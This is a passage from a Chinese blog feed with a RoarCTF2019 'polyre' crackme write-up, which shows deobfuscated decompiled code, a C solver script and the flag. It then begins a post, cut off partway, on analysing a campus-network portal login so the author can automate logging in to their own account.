&#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v12 = v6;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    v13 = v12 &lt; <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v14 = s[v6];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v15 = v14;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    <span class="keyword">if</span> ( v15 == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = &amp;s[v6];</span><br><span class="line">      *v16 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = v6 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v6 = v17;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v18 = i;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v19 = v18 &lt; <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    <span class="keyword">if</span> ( !v19 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v20 = s;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    v4 = *(_QWORD *)&amp;v20[<span class="number">8</span> * i];</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = v7;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        v22 = v21 &lt; <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">      <span class="keyword">if</span> ( !v22 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v23 = v4;</span><br><span class="line">      v24 = v4 &lt; <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v27 = v4;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          v28 = <span class="number">2</span> * v27;</span><br><span class="line">        <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">        v4 = v28;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v25 = <span class="number">2</span> * v4;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          v26 = v25;</span><br><span class="line">        <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">        v4 = v26 ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      v29 = v7;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        v7 = v29 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    v30 = <span class="number">8</span> * i;</span><br><span class="line">    v31 = &amp;s1[<span class="number">8</span> * i];</span><br><span class="line">    <span class="keyword">if</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">LABEL_55:</span><br><span class="line">      *(_QWORD *)v31 = v4;</span><br><span class="line">    *(_QWORD *)v31 = v4;</span><br><span class="line">    <span class="keyword">if</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_55;</span><br><span class="line">    v32 = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    v33 = <span class="built_in">memcmp</span>(s1, &amp;unk_402170, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">  v34 = v33 != <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( v34 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自习一看其实就发现其实它还是加了一些混淆，比如里面重复的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br></pre></td></tr></table></figure><p>这个表达式实际上是永远为假的，它因为dword_603058这个全局变量是在bss段上的，bss段上为未初始化的全局变量，所以它就是0。而且查一下它的交叉引用表也会发现与它相关的指令都是作为源操作数而非目的操作数，而且也没有取它地址做某些操作，在此基础之上我们基本可以认为它就是不变的。</p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/5.png" alt="5"></p><p>所以这去了混淆之后还有一百多行的代码其实是他自己手动疯狂加的混淆。所以这里直接把所有的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">do</span></span></span><br><span class="line"><span class="function">    xxx</span></span><br><span class="line"><span class="function"><span class="title">while</span> <span class="params">( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span></span></span><br></pre></td></tr></table></figure><p>全部替换成xxx就好了，因为它只执行一次就退出了。</p><p>此外还有一些永为1的表达式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( dword_603058 &lt; <span class="number">10</span> || ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>这种情况下我我们直接把while循环去了，然后把这个语句之后在while循环语句内的所有语句都删了。</p><p>然后得到了以下的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// [rsp+1E0h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1E8h] [rbp-108h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">48</span>]; <span class="comment">// [rsp+1F0h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">60</span>]; <span class="comment">// [rsp+220h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+25Ch] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// [rsp+260h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+26Ch] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">bool</span> v13; <span class="comment">// [rsp+272h] [rbp-7Eh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// [rsp+273h] [rbp-7Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+274h] [rbp-7Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// [rsp+278h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+284h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+288h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">bool</span> v19; <span class="comment">// [rsp+28Fh] [rbp-61h]</span></span><br><span class="line">  <span class="keyword">char</span> *v20; <span class="comment">// [rsp+290h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+298h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">bool</span> v22; <span class="comment">// [rsp+29Fh] [rbp-51h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+2A0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">bool</span> v24; <span class="comment">// [rsp+2AFh] [rbp-41h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+2B0h] [rbp-40h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+2B8h] [rbp-38h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+2C0h] [rbp-30h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+2C8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [rsp+2D0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [rsp+2D4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v31; <span class="comment">// [rsp+2D8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [rsp+2E0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [rsp+2E4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">bool</span> v34; <span class="comment">// [rsp+2EBh] [rbp-5h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="keyword">sizeof</span>(s1));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input:&quot;</span>);</span><br><span class="line">  v11 = s;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v11);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">//输入部分，碰到\n截止</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = v6;</span><br><span class="line">    v13 = v12 &lt; <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v14 = s[v6];</span><br><span class="line">    v15 = v14;</span><br><span class="line">    <span class="keyword">if</span> ( v15 == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = &amp;s[v6];</span><br><span class="line">      *v16 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = v6 + <span class="number">1</span>;</span><br><span class="line">    v6 = v17;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = i;</span><br><span class="line">    v19 = v18 &lt; <span class="number">6</span>;<span class="comment">//这里可以看出只有6组</span></span><br><span class="line">    <span class="keyword">if</span> ( !v19 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v20 = s;</span><br><span class="line">    v4 = *(_QWORD *)&amp;v20[<span class="number">8</span> * i];<span class="comment">//转为了QWORD，每组八个字节</span></span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = v7;</span><br><span class="line">      v22 = v21 &lt; <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v22 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v23 = v4;</span><br><span class="line">      v24 = v4 &lt; <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v27 = v4;</span><br><span class="line">        v28 = <span class="number">2</span> * v27;</span><br><span class="line">        v4 = v28;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v25 = <span class="number">2</span> * v4;</span><br><span class="line">        v26 = v25;</span><br><span class="line">        v4 = v26 ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      v29 = v7;</span><br><span class="line">      v7 = v29 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v30 = <span class="number">8</span> * i;</span><br><span class="line">    v31 = &amp;s1[<span class="number">8</span> * i];</span><br><span class="line">    *(_QWORD *)v31 = v4;</span><br><span class="line">    v32 = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v33 = <span class="built_in">memcmp</span>(s1, &amp;unk_402170, <span class="number">0x30</span>uLL);</span><br><span class="line">  v34 = v33 != <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v34 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实最后看来也就是将输入的字符串分为6组，每组八个字节。然后作为long long 类型进行64次变换。</p><p>主要变换逻辑如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v27 = v4;</span><br><span class="line">    v28 = <span class="number">2</span> * v27;</span><br><span class="line">    v4 = v28;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    v25 = <span class="number">2</span> * v4;</span><br><span class="line">    v26 = v25;</span><br><span class="line">    v4 = v26 ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果大于0则直接*2，否则再异或一个0xB0004B7679FA26B3LL。</p><p>然后最后跟unk_402170做一个memcmp，那么就已知结果逆向输入了。主要我们需要怎么判断它是否&gt;0呢，其实很简单，我们可以看到如果&gt;0就单纯*2了，否则还会异或一个奇数，那么就从最低位的奇偶入手，如果是偶数则/2，如果不是那么就先异或再/2就好了。但是需要注意，负数/2并不能单纯右移一位，还要再高位添1才能保证是负数/2。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>据此写出脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> s[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x96</span>, <span class="number">0x62</span>, <span class="number">0x53</span>, <span class="number">0x43</span>, <span class="number">0x6D</span>, <span class="number">0xF2</span>, <span class="number">0x8F</span>, <span class="number">0xBC</span>, </span><br><span class="line">  <span class="number">0x16</span>, <span class="number">0xEE</span>, <span class="number">0x30</span>, <span class="number">0x05</span>, <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x52</span>, </span><br><span class="line">  <span class="number">0xEC</span>, <span class="number">0x08</span>, <span class="number">0x5F</span>, <span class="number">0x93</span>, <span class="number">0xEA</span>, <span class="number">0xB5</span>, <span class="number">0xC0</span>, <span class="number">0x4D</span>, </span><br><span class="line">  <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x53</span>, <span class="number">0xD8</span>, <span class="number">0xAF</span>, <span class="number">0x90</span>, <span class="number">0x2B</span>, <span class="number">0x34</span>, </span><br><span class="line">  <span class="number">0x81</span>, <span class="number">0x36</span>, <span class="number">0x2C</span>, <span class="number">0xAA</span>, <span class="number">0xBC</span>, <span class="number">0x0E</span>, <span class="number">0x25</span>, <span class="number">0x8B</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x8A</span>, <span class="number">0xC6</span>, <span class="number">0xA2</span>, <span class="number">0x81</span>, <span class="number">0x9F</span>, <span class="number">0x75</span>, <span class="number">0x55</span>, </span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> key=<span class="number">0xB0004B7679FA26B3</span>uLL;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *p=(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)s;</span><br><span class="line">    <span class="keyword">int</span> iter=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(iter&lt;<span class="number">6</span>)&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> k=*p;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(k%<span class="number">2</span>)&#123;</span><br><span class="line">                k^=key;</span><br><span class="line">                k/=<span class="number">2</span>;</span><br><span class="line">                k |= <span class="number">0x8000000000000000</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                k/=<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">8</span>;j++)&#123;</span><br><span class="line">            write(<span class="number">1</span>,((<span class="keyword">char</span> *)&amp; k)+j,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        p++;</span><br><span class="line">        iter++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="get-flag"><a href="#get-flag" class="headerlink" title="get flag"></a>get flag</h2><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/6.png" alt="6"></p><p>flag:<code>flag&#123;6ff29390-6c20-4c56-ba70-a95758e3d1f8&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>校园网模拟登录</title>
      <link href="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/"/>
      <url>/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>学校更新了校园网之后，用的宽带就需要每天早上进行一遍网页登录才能有网，非常的麻烦，我就萌生出了想写个模拟登录的脚本的想法。</p><span id="more"></span><h2 id="抓包获得请求方式"><a href="#抓包获得请求方式" class="headerlink" title="抓包获得请求方式"></a>抓包获得请求方式</h2><p>这里我用wireshark抓包，只抓从登录到登录成功这个时间段的包，这里主要分析我们发送的http的流量包。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/4.png" alt="1"></p><p>可以发现主要有两个流量包出现了username字段，那么主要分析这两个包内容的参数。第一个流量包内容如下</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/5.png" alt="1"></p><p>请求api为<code>http://10.110.74.99/cgi-bin/get_challenge</code></p><p>主要有四个参数，<code>callback</code>，<code>username</code>，<code>ip</code>，和<code>_</code>。callback参数不太确定，但是可以确定username是自己登录校园网的账号，ip就是自己本机在这个局域网下的ip，而<code>_</code>很明显就是时间戳。而可以看到call_back后面也有一个类似时间戳的参数。这个暂且不确定，但是后面反复抓包可以发现，这个参数就是固定的。至于本次请求是返回了什么我们可以照着参数打进去看看返回了什么数据，本人很菜，不是打web的，不会用burpsuite只能用这种办法了。</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/6.png" alt="1"></p><p>可以发现返回了一串json数据，里面主要有一个challenge字段，感觉是一个类似token的东西，其它的就没什么了，客户端ip，服务端ip，请求状态，产品版本和时间戳。而这里也方便了我们，可以直接从这里获取自己的ip了，但是网页端做这个估计主要还是为了这个token。但是这里并没有密码字段，还没有登录请求。</p><p>剩下的就看看另一个流量包</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/7.png" alt="1"></p><p>第二个流量包请求的api为<code>http://10.110.74.99/cgi-bin/srun_portal</code></p><p>请求的参数很多，首先依旧是callback，跟之前一样，action参数估计是标识本次请求类型为登录，第四个参数开始出现了密码字段，而这个很明显进行了md5加密，os指示操作系统类型，name为大概也是操作系统名称的意思。还有一个double_stack，虽然不懂但是反复抓包发现这个参数也是恒定不变是0，所以也不用去理解它的意思了。chksum参数是一串可能经过某种hash算法得到的值。info同样如此，只是它括起来的这个加密算法着实没听过。然后剩下的参数都是固定的就没必要去纠结了。</p><p>所以想要成功模拟登录，必须得到这些参数，需要计算的就只有password，chksum，info三个参数，那么去分析一下网页源码看看这三个参数是怎么得到的。</p><h2 id="分析网页js"><a href="#分析网页js" class="headerlink" title="分析网页js"></a>分析网页js</h2><p>F12查看，主要寻找登录按钮点击之后干干了什么</p><h3 id="password加密"><a href="#password加密" class="headerlink" title="password加密"></a>password加密</h3><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/1.png" alt="1"></p><p>可以看到只对前端进行了基本的校验之后调用了portal的login方法去登录，并且输入的用户名和密码也都传进了portal相应的变量当中，那么就去portal.js文件中分析。</p><p>发现文件很大，选择拷贝一份放ide中分析，寻找login函数，</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/2.png" 